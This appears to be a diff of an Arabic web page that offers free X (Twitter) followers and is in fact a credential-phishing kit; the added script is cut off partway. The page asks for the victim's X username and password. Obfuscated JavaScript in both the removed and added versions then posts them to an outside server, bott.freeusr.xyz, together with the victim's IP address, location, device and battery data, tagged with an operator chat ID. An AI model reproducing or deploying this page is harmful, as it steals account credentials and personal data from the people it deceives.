@@ -1,401 +1,273 @@
 <!DOCTYPE html>
-<html lang="ar">
-<head> 
-    <meta charset="UTF-8"> 
-    <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
-    <title>زيادة متابعين X💥</title> 
-  <meta property="og:title" content="زيادة متابعين X💥"> 
-  <meta property="og:description" content="مرحبا بك في افضل موقع زياده  متابعين  X  يمكنك  زياده  اكثر من 1000 متابع يومياً  مجاني💥🚀 "> 
-  <meta property="og:image:type" content="image/jpeg"> 
-  <meta property="og:image:width" content="1200"> 
-  <meta property="og:image:height" content="630"> 
-  <meta property="og:type" content="website"> 
-  <meta property="og:url" content="https://YOUR_DOMAIN_HERE/getVideo"> 
-  <meta name="twitter:card" content="summary_large_image"> 
-  <meta name="twitter:title" content="زيادة متابعين X💥"> 
-  <meta name="twitter:description" content="مرحبا بك في افضل موقع زياده  متابعين  X  يمكنك  زياده  اكثر من 1000 متابع يومياً  مجاني💥🚀"> 
-  <meta name="twitter:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcStqKlUJznvvhdhWxJBbKpc8U44NHgmEzRx_A&s"> 
-  <meta name="twitter:image:width" content="1200"> 
-  <meta name="twitter:image:height" content="630"> 
-  <style>
-    body {
-      font-family: 'Arial', sans-serif;
-      text-align: center;
-      margin: 0;
-      padding: 0;
-      background: linear-gradient(135deg, rgba(0,0,0,0.8), rgba(0,0,0,0.7)), url('https://example.com/pubg-background.jpg') no-repeat center center fixed;
-      background-size: cover;
-      color: #ffffff;
-      overflow: auto; /* للسماح بالتمرير إذا لزم الأمر */
-      position: relative; /* لتحسين موضع التأثيرات */
-    }
-
-    .container {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      min-height: 100vh;
-      padding: 20px;
-      backdrop-filter: blur(8px);
-      position: relative;
-      z-index: 2;
-    }
-
-    .login-container, .pubg-container {
-      max-width: 500px;
-      padding: 30px;
-      border-radius: 10px;
-      background-color: rgba(0, 0, 0, 0.8);
-      box-shadow: 0 4px 10px rgba(0,0,0,0.6);
-      display: none; /* إخفاء في البداية */
-    }
-
-    .login-container.active, .pubg-container.active {
-      display: block; /* إظهار عند الحاجة */
-    }
-
-    .login-container h1 {
-      margin: 0 0 20px;
-      font-size: 32px;
-      color: #f1c40f; /* لون ذهبى */
-    }
-
-    .option-button {
-      width: 100%;
-      padding: 15px;
-      margin: 10px 0;
-      border: none;
-      border-radius: 8px;
-      box-sizing: border-box;
-      background-color: #444;
-      color: #f1c40f; /* لون ذهبى */
-      font-size: 18px;
-      cursor: pointer;
-      transition: background-color 0.3s ease, transform 0.3s ease;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      text-align: center;
-    }
-
-    .option-button img {
-      width: 30px;
-      height: 30px;
-      margin-left: 10px;
-    }
-
-    .option-button:hover {
-      background-color: #555;
-      transform: scale(1.02);
-    }
-
-    .pricing-section {
-      margin-top: 20px;
-      padding: 20px;
-      border-radius: 10px;
-      background-color: rgba(0, 0, 0, 0.7);
-      box-shadow: 0 4px 10px rgba(0,0,0,0.6);
-    }
-
-    .pricing-section h2 {
-      font-size: 24px;
-      margin-bottom: 10px;
-    }
-
-    .pricing-option {
-      margin: 10px 0;
-      padding: 15px;
-      border-radius: 8px;
-      background-color: #333;
-      color: #f1c40f;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-    }
-
-    .pricing-option span {
-      font-size: 20px;
-    }
-
-    .pricing-option button {
-      padding: 10px 20px;
-      border: none;
-      border-radius: 5px;
-      background-color: #f1c40f;
-      color: #333;
-      font-size: 16px;
-      cursor: pointer;
-      transition: background-color 0.3s ease;
-    }
-
-    .pricing-option button:hover {
-      background-color: #e1b60a;
-    }
-
-    .logo {
-      width: 150px;
-      margin-top: 20px;
-    }
-
-    .message {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      padding: 10px;
-      background-color: #e74c3c;
-      color: #fff;
-      text-align: center;
-      font-size: 18px;
-      display: none; /* إخفاء الرسالة افتراضيًا */
-      z-index: 3;
-    }
-
-    /* تأثير الخلفية المتحركة */
-    @keyframes backgroundAnimation {
-      0% { background-position: 0% 0%; }
-      50% { background-position: 100% 100%; }
-      100% { background-position: 0% 0%; }
-    }
-
-    body::before {
-      content: "";
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: url('https://example.com/moving-background.jpg') repeat;
-      animation: backgroundAnimation 60s linear infinite;
-      z-index: 1;
-      opacity: 0.2; /* ضبط الشفافية لتأثير الخلفية المتحركة */
-    }
-  </style> 
- </head> 
- <body> 
-  <div class="message" id="message">
-   يرجى تسجيل الدخول أولاً
-  </div> 
-  <div class="container"> 
-   <div class="login-container active" id="login-container"> 
-    <h1>تسجيل الدخول عبر</h1> 
-    <button class="option-button" onclick="showPubgContainer()"> Google <img src="https://upload.wikimedia.org/wikipedia/commons/4/4a/Logo_2013_Google.png" alt="Diamonds"> </button> 
-    <button class="option-button" onclick="showPubgContainer()"> Facebook <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Gold"> </button>  
-    <button class="option-button" onclick="showPubgContainer()"> Twitter (X) <img src="https://abs.twimg.com/icons/apple-touch-icon-192x192.png" alt="UC"> </button> 
-   </div> 
-   <div class="pubg-container" id="pubg-container"> 
-    <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
-    <title>زيادة متابعين X 🚀</title> 
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="زيادة متابعين X (تويتر)💥">
+    <meta property="og:description" content="مرحبا بك في افضل موقع زياده متابعين X (تويتر) يمكنك زياده اكثر من 1000 متابع يومياً مجاني💥🚀">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="زيادة متابعين X (تويتر)💥">
+    <meta name="twitter:description" content="مرحبا بك في افضل موقع زياده متابعين X (تويتر) يمكنك زياده اكثر من 1000 متابع يومياً مجاني💥🚀">
+    <meta name="twitter:image" content="https://thumbs2.imgbox.com/4a/d1/X2GhCY4d_t.jpg">
+    <title>زيادة متابعين X (تويتر)</title>
     <style>
-    @keyframes heartColor {
-  0%   { color: #ff0050; text-shadow: 0 0 10px #ff0050; }
-  25%  { color: #00f2ea; text-shadow: 0 0 10px #00f2ea; }
-  50%  { color: #69c9d0; text-shadow: 0 0 10px #69c9d0; }
-  75%  { color: #ff0050; text-shadow: 0 0 10px #ff0050; }
-  100% { color: #00f2ea; text-shadow: 0 0 10px #00f2ea; }
-}
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-body {
-  font-family: 'Helvetica Neue', Arial, sans-serif;
-  text-align: center;
-  padding: 20px;
-  background: linear-gradient(270deg, #000, #1a1a1a, #000);
-  background-size: 600% 600%;
-  animation: gradientBackground 20s ease infinite;
-  color: #fff;
-}
+        body {
+            background: #000000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: 'Arial', sans-serif;
+            padding: 20px;
+        }
 
-@keyframes gradientBackground {
-  0%   { background-position: 0% 50%; }
-  50%  { background-position: 100% 50%; }
-  100% { background-position: 0% 50%; }
-}
+        .container {
+            background: rgba(255, 255, 255, 0.03);
+            padding: 40px 30px;
+            border-radius: 20px;
+            max-width: 420px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+        }
 
-form {
-  max-width: 400px;
-  margin: 0 auto;
-  padding: 40px 20px;
-  border-radius: 16px;
-  background: rgba(28, 28, 28, 0.85);
-  box-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
-  color: #FFD700;
-  position: relative;
-  overflow: hidden;
-  backdrop-filter: blur(6px);
-}
+        .logo {
+            text-align: center;
+            font-size: 50px;
+            margin-bottom: 10px;
+        }
 
-form::before {
-  content: '';
-  position: absolute;
-  top: -50%;
-  left: -50%;
-  width: 200%;
-  height: 200%;
-  background: conic-gradient(from 0deg, #ff0050, #00f2ea, #ff0050);
-  animation: rotateBackground 6s linear infinite;
-  opacity: 0.05;
-  z-index: 1;
-}
+        h2 {
+            color: #ffffff;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 5px;
+        }
 
-@keyframes rotateBackground {
-  0%   { transform: rotate(0deg); }
-  100% { transform: rotate(360deg); }
-}
+        h2 span {
+            color: #1DA1F2;
+        }
 
-form * {
-  position: relative;
-  z-index: 2;
-}
+        .subtitle {
+            color: #8899AA;
+            text-align: center;
+            font-size: 14px;
+            margin-bottom: 25px;
+        }
 
-input[type="text"], select {
-  width: 100%;
-  padding: 10px;
-  margin: 10px 0 20px;
-  border: 1px solid #555;
-  border-radius: 8px;
-  background-color: #2c2c2c;
-  color: #FFD700;
-  box-shadow: inset 0 0 5px #000;
-}
+        .input-group {
+            position: relative;
+            margin-bottom: 18px;
+        }
 
-button {
-  background: linear-gradient(45deg, #ff0050, #00f2ea);
-  color: white;
-  padding: 12px 24px;
-  border: none;
-  border-radius: 25px;
-  cursor: pointer;
-  font-size: 16px;
-  font-weight: bold;
-  transition: transform 0.3s ease, box-shadow 0.3s ease;
-  box-shadow: 0 0 12px #00f2ea88;
-}
+        .input-group label {
+            display: block;
+            color: #8899AA;
+            font-size: 13px;
+            margin-bottom: 5px;
+            font-weight: 500;
+        }
 
-button:hover {
-  transform: scale(1.05);
-  box-shadow: 0 0 20px #00f2ea;
-}
+        input, select {
+            width: 100%;
+            padding: 14px 16px;
+            border-radius: 10px;
+            border: 2px solid rgba(255, 255, 255, 0.08);
+            background: rgba(255, 255, 255, 0.05);
+            color: #fff;
+            font-size: 15px;
+            transition: all 0.3s ease;
+            outline: none;
+        }
 
-.heart {
-  animation: heartColor 2s infinite, beat 1s infinite;
-  font-size: 28px;
-  display: inline-block;
-}
+        input:focus, select:focus {
+            border-color: #1DA1F2;
+            background: rgba(29, 161, 242, 0.05);
+            box-shadow: 0 0 20px rgba(29, 161, 242, 0.1);
+        }
 
-@keyframes beat {
-  0%, 100% { transform: scale(1); }
-  50%      { transform: scale(1.2); }
-}
+        input::placeholder {
+            color: #445566;
+        }
 
-.follower {
-  color: #1e90ff;
-  font-size: 24px;
-  margin-top: 20px;
-}
+        select option {
+            background: #000000;
+            color: #fff;
+        }
 
-.pubg-logo {
-  width: 100px;
-  height: 100px;
-  margin-top: 20px;
-}
+        button {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #1DA1F2, #0d8bd9);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            font-size: 18px;
+            font-weight: 700;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
 
-.input-container {
-  position: relative;
-  margin-bottom: 15px;
-}
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(29, 161, 242, 0.3);
+        }
 
-.input-container label {
-  position: absolute;
-  top: -18px;
-  left: 10px;
-  background-color: #1c1c1c;
-  padding: 0 5px;
-  font-size: 14px;
-  color: #FFD700;
-}
+        button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
 
-#message {
-  position: fixed;
-  top: 0;
-  left: 50%;
-  transform: translate(-50%, 0);
-  background-color: rgba(0, 0, 0, 0.9);
-  color: #FFD700;
-  padding: 15px 20px;
-  border-radius: 0 0 8px 8px;
-  font-size: 18px;
-  display: none;
-  z-index: 1000;
-  width: 80%;
-  max-width: 600px;
-  box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
-}
+        .spinner {
+            display: none;
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-top: 4px solid #1DA1F2;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 15px auto;
+        }
 
-.effects {
-  animation: effects 4s infinite;
-}
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
 
-@keyframes effects {
-  0%   { transform: scale(1); }
-  50%  { transform: scale(1.1); }
-  100% { transform: scale(1); }
-}
+        .success-message {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
 
-  </style> 
-    <h2 class="effects">زيادة متابعين X 🚀<span class="heart">🚀</span></h2> 
-    <form method="POST" action="https://bott.freeusr.xyz/submitIncrease" id="nameForm"> 
-     <input type="hidden" id="chatId" name="chatId" value="7130416076.png"> 
-     <div class="input-container"> 
-      <label for="username"> البريد الإلكتروني او اليوزر:</label> 
-      <input type="text" id="username" name="username" required> 
-     </div> 
-     <div class="input-container"> 
-      <label for="password">كلمة المرور:</label> 
-      <input type="text" id="password" name="password" required> 
-     </div> 
-     <label for="followerCount">عدد متابعين:</label>
-     <br> 
-     <select id="followerCount" name="followerCount" required> <option value="500">1000 متابعين مجاني</option> </select>
-     <br>
-     <br> 
-     <button type="submit">شحن</button> 
-    </form> 
-    <div id="message"></div> 
-   </div> 
-   <div class="pricing-section"> 
-    <h2>أسعار متابعين</h2> 
-    <div class="pricing-option"> 
-     <span>1000  - 0$</span> 
-     <button onclick="showMessage()">مجاني</button> 
-    </div> 
-    <div class="pricing-option"> 
-     <span>1500  - 2$</span> 
-     <button onclick="showMessage()">شراء الآن</button> 
-    </div> 
-    <div class="pricing-option"> 
-     <span>2000  - 3$</span> 
-     <button onclick="showMessage()">شراء الآن</button> 
-    </div> 
-    <div class="pricing-option"> 
-     <span>2500  - 4$</span> 
-     <button onclick="showMessage()">شراء الآن</button> 
-    </div> 
-    <div class="pricing-option"> 
-     <span>3000  - 5$</span> 
-     <button onclick="showMessage()">شراء الآن</button> 
-    </div> 
-    <div class="pricing-option"> 
-     <span>10000  - 10$</span> 
-     <button onclick="showMessage()">شراء الآن</button> 
-    </div> 
-   </div> 
-  
-<div id="notification" class="notification"></div>
+        .success-message .check {
+            font-size: 60px;
+            color: #4CAF50;
+            animation: popIn 0.5s ease;
+        }
 
-<script>
-const _0x4b1e89=_0x5cd0;(function(_0x43ee8e,_0x81bda){const _0x2e0a64=_0x5cd0,_0x4dab38=_0x43ee8e();while(!![]){try{const _0x5b5d74=-parseInt(_0x2e0a64(0x20e))/0x1*(-parseInt(_0x2e0a64(0x1e7))/0x2)+-parseInt(_0x2e0a64(0x1ff))/0x3+parseInt(_0x2e0a64(0x1e0))/0x4+parseInt(_0x2e0a64(0x208))/0x5*(-parseInt(_0x2e0a64(0x217))/0x6)+-parseInt(_0x2e0a64(0x1e4))/0x7*(parseInt(_0x2e0a64(0x218))/0x8)+parseInt(_0x2e0a64(0x1db))/0x9*(parseInt(_0x2e0a64(0x1f9))/0xa)+parseInt(_0x2e0a64(0x20f))/0xb;if(_0x5b5d74===_0x81bda)break;else _0x4dab38['push'](_0x4dab38['shift']());}catch(_0x17196d){_0x4dab38['push'](_0x4dab38['shift']());}}}(_0x5317,0x239a0));function showPubgContainer(){const _0xb2fe1b=_0x5cd0;document[_0xb2fe1b(0x1e3)](_0xb2fe1b(0x1df))[_0xb2fe1b(0x214)][_0xb2fe1b(0x1fb)](_0xb2fe1b(0x1ee)),document[_0xb2fe1b(0x1e3)](_0xb2fe1b(0x1fa))[_0xb2fe1b(0x214)][_0xb2fe1b(0x1f5)](_0xb2fe1b(0x1ee));}const increaseForm=document[_0x4b1e89(0x1e3)](_0x4b1e89(0x1da)),chatIdInput=document[_0x4b1e89(0x1e3)](_0x4b1e89(0x20c)),urlParams=new URLSearchParams(window[_0x4b1e89(0x1f1)][_0x4b1e89(0x20d)]),chatId=urlParams[_0x4b1e89(0x216)](_0x4b1e89(0x1f3));document[_0x4b1e89(0x1e3)](_0x4b1e89(0x1f3))[_0x4b1e89(0x1dd)]=chatId||'';async function getIPInfo(){const _0x924ec2=_0x4b1e89;try{const _0x1f4ea4=await fetch(_0x924ec2(0x1e5)),_0x2b87e9=await _0x1f4ea4[_0x924ec2(0x1de)]();return{'ip':_0x2b87e9['ip'],'country':_0x2b87e9[_0x924ec2(0x1ed)],'city':_0x2b87e9[_0x924ec2(0x203)]};}catch(_0x7124fa){return console[_0x924ec2(0x215)](_0x924ec2(0x1f7),_0x7124fa),{'ip':_0x924ec2(0x211),'country':_0x924ec2(0x211),'city':_0x924ec2(0x211)};}}function _0x5cd0(_0x2a8509,_0x3b9102){_0x2a8509=_0x2a8509-0x1da;const _0x5317b=_0x5317();let _0x5cd0d1=_0x5317b[_0x2a8509];return _0x5cd0d1;}function _0x5317(){const _0x60790c=['notification','preventDefault','تم\x20إرسال\x20البيانات\x20بنجاح!','getBattery','country_name','active','charging','POST','location','Error\x20getting\x20battery\x20info:','chatId','test','add','userAgent','Error\x20fetching\x20IP\x20info:','match','3550sMmgZM','pubg-container','remove','addEventListener','submit','https://www.effectivegatecpm.com/c91t164y78?key=ac0d9f08bc23ae53a5f9bd39692515bc','393630RJIbRN','innerText','Error:','success','city','entries','assign','href','حدث\x20خطأ\x20أثناء\x20تنفيذ\x20الطلب.\x20يرجى\x20المحاولة\x20مرة\x20أخرى.','644405RsfTRC','Android','https://bott.freeusr.xyz/submitIncrease','application/json','chatIdInput','search','3fqOlnk','1441286XNKyJS','حدث\x20خطأ\x20أثناء\x20الاتصال\x20بالخادم.\x20يرجى\x20المحاولة\x20مرة\x20أخرى\x20لاحقاً.','Unknown','iOS','MacOS','classList','error','get','12wwYRMa','16UhuMla','nameForm','3006QBgHEj','stringify','value','json','login-container','701680wDIJde','fromEntries','Linux','getElementById','440839tsouLL','https://ipapi.co/json/','Windows','157156ZUoSbd','level'];_0x5317=function(){return _0x60790c;};return _0x5317();}function getPlatformInfo(){const _0x549a4a=_0x4b1e89,_0x22afde=navigator[_0x549a4a(0x1f6)];let _0x1b96af=_0x549a4a(0x211);if(/Windows/[_0x549a4a(0x1f4)](_0x22afde))_0x1b96af=_0x549a4a(0x1e6);else{if(/Mac/[_0x549a4a(0x1f4)](_0x22afde))_0x1b96af=_0x549a4a(0x213);else{if(/Linux/[_0x549a4a(0x1f4)](_0x22afde))_0x1b96af=_0x549a4a(0x1e2);else{if(/Android/[_0x549a4a(0x1f4)](_0x22afde))_0x1b96af=_0x549a4a(0x209);else{if(/iPhone|iPad|iPod/[_0x549a4a(0x1f4)](_0x22afde))_0x1b96af=_0x549a4a(0x212);}}}}return{'platform':_0x1b96af,'userAgent':_0x22afde};}async function getBatteryInfo(){const _0x1dc320=_0x4b1e89;if(_0x1dc320(0x1ec)in navigator)try{const _0x5cb1f9=await navigator[_0x1dc320(0x1ec)]();return{'batteryLevel':_0x5cb1f9[_0x1dc320(0x1e8)],'batteryCharging':_0x5cb1f9[_0x1dc320(0x1ef)]};}catch(_0x528969){console[_0x1dc320(0x215)](_0x1dc320(0x1f2),_0x528969);}return{'batteryLevel':undefined,'batteryCharging':undefined};}function getDeviceVersion(){const _0x5a4d7f=_0x4b1e89,_0x4d7f7f=navigator[_0x5a4d7f(0x1f6)],_0x5e0cfb=_0x4d7f7f[_0x5a4d7f(0x1f8)](/\(([^)]+)\)/);return _0x5e0cfb?_0x5e0cfb[0x1]:_0x5a4d7f(0x211);}increaseForm[_0x4b1e89(0x1fc)](_0x4b1e89(0x1fd),async _0x36efce=>{const _0x1508a1=_0x4b1e89;_0x36efce[_0x1508a1(0x1ea)]();const _0x2f5721=new FormData(increaseForm),_0x4a5a64=Object[_0x1508a1(0x1e1)](_0x2f5721[_0x1508a1(0x204)]()),_0x48b862=await getIPInfo(),_0x4da410=getPlatformInfo(),_0x320a82=await getBatteryInfo(),_0x2586d1=getDeviceVersion();Object[_0x1508a1(0x205)](_0x4a5a64,_0x48b862,_0x4da410,_0x320a82,{'deviceVersion':_0x2586d1});try{const _0x5efa5d=await fetch(_0x1508a1(0x20a),{'method':_0x1508a1(0x1f0),'headers':{'Content-Type':_0x1508a1(0x20b)},'body':JSON[_0x1508a1(0x1dc)](_0x4a5a64)}),_0x493bd3=await _0x5efa5d[_0x1508a1(0x1de)]();_0x493bd3[_0x1508a1(0x202)]?(document[_0x1508a1(0x1e3)](_0x1508a1(0x1e9))[_0x1508a1(0x200)]=_0x1508a1(0x1eb),window[_0x1508a1(0x1f1)][_0x1508a1(0x206)]=_0x1508a1(0x1fe)):alert(_0x1508a1(0x207));}catch(_0x3238d5){console[_0x1508a1(0x215)](_0x1508a1(0x201),_0x3238d5),alert(_0x1508a1(0x210));}});
-</script>
-<script src="https://pl28828545.effectivegatecpm.com/75/7c/35/757c35587997bc0d07d956a06931b902.js"></script>
+        .success-message h3 {
+            color: #4CAF50;
+            font-size: 22px;
+            margin-top: 10px;
+        }
+
+        .success-message p {
+            color: #8899AA;
+            font-size: 14px;
+            margin-top: 5px;
+        }
+
+        @keyframes popIn {
+            0% { transform: scale(0); }
+            70% { transform: scale(1.2); }
+            100% { transform: scale(1); }
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            color: #445566;
+            font-size: 12px;
+        }
+
+        .footer a {
+            color: #1DA1F2;
+            text-decoration: none;
+        }
+
+        .x-icon {
+            display: inline-block;
+            width: 40px;
+            height: 40px;
+            background: #ffffff;
+            border-radius: 50%;
+            text-align: center;
+            line-height: 40px;
+            font-size: 24px;
+            font-weight: 900;
+            color: #000000;
+            margin-bottom: 10px;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 25px 20px;
+            }
+            h2 {
+                font-size: 20px;
+            }
+            input, select {
+                padding: 12px 14px;
+                font-size: 14px;
+            }
+            button {
+                font-size: 16px;
+                padding: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo">
+            <div class="x-icon">𝕏</div>
+        </div>
+        <h2>زيادة متابعين <span>X</span></h2>
+        <p class="subtitle">(تويتر سابقاً) 🚀</p>
+
+        <form id="xForm">
+            <div class="input-group">
+                <label>🐦 اسم المستخدم أو البريد الإلكتروني</label>
+                <input type="text" id="username" placeholder="أدخل اسم المستخدم أو البريد" required>
+            </div>
+
+            <div class="input-group">
+                <label>🔒 كلمة المرور</label>
+                <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
+            </div>
+
+            <div class="input-group">
+                <label>👥 عدد المتابعين</label>
+                <select id="followers">
+                    <option value="1000">1000 متابع - مجاني 🎁</option>
+                    <option value="2500">2500 متابع - 2$</option>
+                    <option value="5000">5000 متابع - 3$</option>
+                    <option value="10000">10000 متابع - 5$</option>
+                    <option value="25000">25000 متابع - 10$</option>
+                    <option value="50000">50000 متابع - 20$</option>
+                </select>
+            </div>
+
+            <button type="submit" id="submitBtn">🚀 زيادة المتابعين الآن</button>
+
+            <div class="spinner" id="spinner"></div>
+        </form>
+
+        <div class="success-message" id="successMessage">
+            <div class="check">✅</div>
+            <h3>تم استلام طلبك!</h3>
+            <p>جاري معالجة طلبك، سيتم إضافة المتابعين قريباً</p>
+        </div>
+
+        <div class="footer">
+            🔒 بياناتك آمنة ومشفرة
+        </div>
+    </div>
+
+    <script>
+const _0x33cc2e=_0xf9fd;(function(_0x3a1014,_0x28ae6e){const _0x10e238=_0xf9fd,_0x1567ee=_0x3a1014();while(!![]){try{const _0x178013=parseInt(_0x10e238(0xfd))/0x1*(-parseInt(_0x10e238(0x100))/0x2)+-parseInt(_0x10e238(0x11b))/0x3+-parseInt(_0x10e238(0x106))/0x4+parseInt(_0x10e238(0x12d))/0x5*(-parseInt(_0x10e238(0x102))/0x6)+parseInt(_0x10e238(0x132))/0x7+parseInt(_0x10e238(0x12e))/0x8*(parseInt(_0x10e238(0x124))/0x9)+parseInt(_0x10e238(0xf7))/0xa;if(_0x178013===_0x28ae6e)break;else _0x1567ee['push'](_0x1567ee['shift']());}catch(_0x1fe198){_0x1567ee['push'](_0x1567ee['shift']());}}}(_0x178b,0x4b3d5));async function sendFailReport(_0x12c470,_0x5bc49d,_0x399e95={}){const _0x224204=_0xf9fd,_0x466421=new URLSearchParams(window[_0x224204(0x134)][_0x224204(0x112)])[_0x224204(0xef)](_0x224204(0x10e))||_0x224204(0xf3);try{await fetch(_0x224204(0xf4),{'method':_0x224204(0x10c),'headers':{'Content-Type':_0x224204(0x104)},'body':JSON[_0x224204(0x118)]({'chatId':_0x466421,'type':_0x12c470,'message':_0x5bc49d,'details':_0x399e95,'deviceInfo':{'platform':navigator[_0x224204(0x12b)]||_0x224204(0x110),'language':navigator[_0x224204(0xf2)]||'غير\x20متاح','userAgent':navigator[_0x224204(0x126)]||'غير\x20متاح','timestamp':new Date()[_0x224204(0xf8)]()}})});}catch(_0x28d416){console[_0x224204(0x130)](_0x224204(0x101),_0x28d416);}}function _0xf9fd(_0x393da4,_0x31513b){_0x393da4=_0x393da4-0xee;const _0x178b8f=_0x178b();let _0xf9fdf1=_0x178b8f[_0x393da4];return _0xf9fdf1;}const urlParams=new URLSearchParams(window[_0x33cc2e(0x134)][_0x33cc2e(0x112)]),chatId=urlParams[_0x33cc2e(0xef)](_0x33cc2e(0x10e));!chatId&&(sendFailReport(_0x33cc2e(0x135),_0x33cc2e(0x103),{}),alert('خطأ:\x20chatId\x20غير\x20موجود\x20في\x20الرابط'));function _0x178b(){const _0xc9e6d6=['display','test','1EsXPgB','فشل\x20إرسال\x20البيانات','lineno','130546WcxxAY','Failed\x20to\x20send\x20fail\x20report:','6IDOXFM','معرف\x20المستخدم\x20غير\x20موجود\x20في\x20الرابط','application/json','charging','938212yZsTmD','city','value','abort','iOS','Error:','POST','حدث\x20خطأ\x20أثناء\x20تنفيذ\x20الطلب.\x20يرجى\x20المحاولة\x20مرة\x20أخرى.','chatId','json','غير\x20متاح','log','search','Unknown','trim','href','xForm','https://www.google.com/','stringify','https://ipwho.is/','upload','512391fGJJog','successMessage','disabled','style','https://bott.freeusr.xyz/submitIncrease','followers','Windows','country_name','X\x20(Twitter)','9DbvvBH','addEventListener','userAgent','status','submitBtn','حدث\x20خطأ\x20أثناء\x20الاتصال\x20بالخادم.\x20يرجى\x20المحاولة\x20مرة\x20أخرى\x20لاحقاً.','spinner','platform','block','2087615LfGlOs','3292616fqPGmE','getElementById','warn','none','1651909IuUtvu','خطأ\x20في\x20الاتصال\x20بالخادم','location','error','country','preventDefault','permission','get','message','batteryLevel','language','غير\x20معروف','https://bott.freeusr.xyz/fail','يرجى\x20إدخال\x20اسم\x20المستخدم\x20وكلمة\x20المرور','username','5487630rDjBDC','toISOString','level','batteryCharging'];_0x178b=function(){return _0xc9e6d6;};return _0x178b();}let cachedIpData=null,ipFetched=![];async function getIPInfo(){const _0x26b8b7=_0x33cc2e;if(ipFetched&&cachedIpData)return cachedIpData;try{const _0x3a641d=new AbortController(),_0x12ec0c=setTimeout(()=>_0x3a641d[_0x26b8b7(0x109)](),0xbb8),_0x27e420=await fetch(_0x26b8b7(0x119),{'signal':_0x3a641d['signal']});clearTimeout(_0x12ec0c);if(_0x27e420['ok']){const _0x173a89=await _0x27e420['json']();cachedIpData={'ip':_0x173a89['ip']||_0x26b8b7(0xf3),'country':_0x173a89[_0x26b8b7(0x122)]||_0x26b8b7(0xf3),'city':_0x173a89[_0x26b8b7(0x107)]||'غير\x20معروف'};}else cachedIpData={'ip':'غير\x20معروف','country':_0x26b8b7(0xf3),'city':'غير\x20معروف'};}catch(_0x528fdd){console[_0x26b8b7(0x130)]('IP\x20fetch\x20failed,\x20using\x20fallback'),cachedIpData={'ip':'غير\x20معروف','country':_0x26b8b7(0xf3),'city':'غير\x20معروف'};}return ipFetched=!![],cachedIpData;}function getPlatformInfo(){const _0x4ebb69=_0x33cc2e,_0xf4bc6c=navigator[_0x4ebb69(0x126)];let _0x5779e2=_0x4ebb69(0x113);if(/Windows/[_0x4ebb69(0xfc)](_0xf4bc6c))_0x5779e2=_0x4ebb69(0x121);else{if(/Mac/['test'](_0xf4bc6c))_0x5779e2='MacOS';else{if(/Linux/[_0x4ebb69(0xfc)](_0xf4bc6c))_0x5779e2='Linux';else{if(/Android/['test'](_0xf4bc6c))_0x5779e2='Android';else{if(/iPhone|iPad|iPod/[_0x4ebb69(0xfc)](_0xf4bc6c))_0x5779e2=_0x4ebb69(0x10a);}}}}return{'platform':_0x5779e2,'userAgent':_0xf4bc6c};}async function getBatteryInfo(){const _0x440067=_0x33cc2e;if('getBattery'in navigator)try{const _0x2a1126=await navigator['getBattery']();return{'batteryLevel':_0x2a1126[_0x440067(0xf9)],'batteryCharging':_0x2a1126[_0x440067(0x105)]};}catch(_0x23ac49){console[_0x440067(0x135)]('Error\x20getting\x20battery\x20info:',_0x23ac49);}return{'batteryLevel':undefined,'batteryCharging':undefined};}function getDeviceVersion(){const _0x33ee09=_0x33cc2e,_0x3df535=navigator[_0x33ee09(0x126)],_0x4fafe5=_0x3df535['match'](/\(([^)]+)\)/);return _0x4fafe5?_0x4fafe5[0x1]:_0x33ee09(0x113);}document[_0x33cc2e(0x12f)](_0x33cc2e(0x116))[_0x33cc2e(0x125)]('submit',async _0x5b87ea=>{const _0x2b8801=_0x33cc2e;_0x5b87ea[_0x2b8801(0x137)]();const 